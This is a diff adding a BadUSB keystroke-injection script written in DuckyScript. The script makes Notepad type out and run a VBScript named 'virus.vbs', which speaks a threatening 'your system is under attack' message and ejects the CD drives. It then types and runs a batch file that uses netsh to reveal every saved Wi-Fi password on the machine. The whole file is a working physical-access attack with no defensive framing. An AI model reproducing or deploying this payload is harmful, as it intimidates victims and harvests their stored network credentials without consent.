@@ -1,0 +1,242 @@
+DELAY 3000
+GUI r
+DELAY 500
+STRING notepad
+DELAY 300
+ENTER
+DELAY 500
+STRING Dim text, speech
+ENTER
+STRING Set speech = CreateObject("SAPI.SpVoice")
+ENTER
+STRING text = "hello this is a bad usb and your sistem is currently under attack      I can take controll on your sistem    staarting from your p ciz  C D drive     upto your   why fi                                what                            it seems u  do  not belive   me       ok then                     lets begin"
+ENTER
+STRING speech.Speak text
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING Set oWMP = CreateObject("WMPlayer.OCX.7" )
+ENTER
+STRING Set colCDROMs = oWMP.cdromCollection
+ENTER
+STRING if colCDROMs.Count >= 1 then
+ENTER
+STRING For i = 0 to colCDROMs.Count - 1
+ENTER
+STRING colCDROMs.Item(i).Eject
+ENTER
+STRING Next ' cdrom
+ENTER
+STRING End if
+ENTER
+STRING 
+ENTER
+STRING 
+ENTER
+STRING Dim tex, speec
+ENTER
+STRING Set speec = CreateObject("SAPI.SpVoice")
+ENTER
+STRING tex = "what , u do not belive me   , okay  so   this is your wifi details                              boum"
+ENTER
+STRING speec.Speak tex
+ENTER
+DELAY 200
+CTRL s
+DELAY 500
+STRING virus.vbs
+DELAY 500
+ENTER
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+GUI
+DELAY 300
+STRING v
+DELAY 300
+STRING i
+DELAY 300
+STRING r
+DELAY 300
+STRING us.vbs
+DELAY 1000
+ENTER
+DELAY 20000
+DELAY 6000
+GUI r
+DELAY 500
+STRING notepad
+DELAY 300
+ENTER
+DELAY 500
+STRING \@echo off
+ENTER
+STRING 
+ENTER
+STRING setlocal enabledelayedexpansion
+ENTER
+STRING 
+ENTER
+STRING :main
+ENTER
+STRING     title WiFiPasswordReveal v1.0 (c) lallouslab.net - The Batchography book
+ENTER
+STRING     
+ENTER
+STRING     echo.
+ENTER
+STRING     echo Reveal all saved WiFi passwords Batch file script v1.0 (c) lallouslab.net
+ENTER
+STRING     echo.
+ENTER
+STRING     echo Inspired by the book "Batchography: The Art of Batch Files Programming"
+ENTER
+STRING     echo.
+ENTER
+STRING 
+ENTER
+STRING     :: Get all the profiles
+ENTER
+STRING     call :get-profiles r
+ENTER
+STRING 
+ENTER
+STRING     :: For each profile, try to get the password
+ENTER
+STRING     :main-next-profile
+ENTER
+STRING         for /f "tokens=1* delims=," %%a in ("%r%") do (
+ENTER
+STRING             call :get-profile-key "%%a" key
+ENTER
+STRING             if "!key!" NEQ "" (
+ENTER
+STRING                 echo WiFi: [%%a] Password: [!key!]
+ENTER
+STRING             )
+ENTER
+STRING             set r=%%b
+ENTER
+STRING         )
+ENTER
+STRING         if "%r%" NEQ "" goto main-next-profile
+ENTER
+STRING 
+ENTER
+STRING     echo.
+ENTER
+STRING     pause
+ENTER
+STRING 
+ENTER
+STRING     goto :eof
+ENTER
+STRING 
+ENTER
+STRING ::
+ENTER
+STRING :: Get the WiFi key of a given profile
+ENTER
+STRING :get-profile-key <1=profile-name> <2=out-profile-key>
+ENTER
+STRING     setlocal
+ENTER
+STRING 
+ENTER
+STRING     set result=
+ENTER
+STRING 
+ENTER
+STRING     FOR /F "usebackq tokens=2 delims=:" %%a in (
+ENTER
+STRING         `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (
+ENTER
+STRING         set result=%%a
+ENTER
+STRING         set result=!result:~1!
+ENTER
+STRING     )
+ENTER
+STRING     (
+ENTER
+STRING         endlocal
+ENTER
+STRING         set %2=%result%
+ENTER
+STRING     )
+ENTER
+STRING 
+ENTER
+STRING     goto :eof
+ENTER
+STRING 
+ENTER
+STRING ::
+ENTER
+STRING :: Get all network profiles (comma separated) into the result result-variable
+ENTER
+STRING :get-profiles <1=result-variable>
+ENTER
+STRING     setlocal
+ENTER
+STRING 
+ENTER
+STRING     set result=
+ENTER
+STRING 
+ENTER
+STRING    
+ENTER
+STRING     FOR /F "usebackq tokens=2 delims=:" %%a in (
+ENTER
+STRING         `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (
+ENTER
+STRING         set val=%%a
+ENTER
+STRING         set val=!val:~1!
+ENTER
+STRING 
+ENTER
+STRING         set result=%!val!,!result!
+ENTER
+STRING     )
+ENTER
+STRING     (
+ENTER
+STRING         endlocal
+ENTER
+STRING         set %1=%result:~0,-1%
+ENTER
+STRING     )
+ENTER
+STRING 
+ENTER
+STRING     goto :eof
+ENTER
+DELAY 400
+CTRL s
+DELAY 500
+STRING wifi.bat
+DELAY 500
+ENTER
+DELAY 500
+LEFT
+DELAY 500
+ENTER
+DELAY 1000
+GUI
+DELAY 400
+STRING w
+DELAY 400
+STRING i
+DELAY 400
+STRING f
+DELAY 400
+STRING i.bat
+DELAY 1000
+ENTER
+
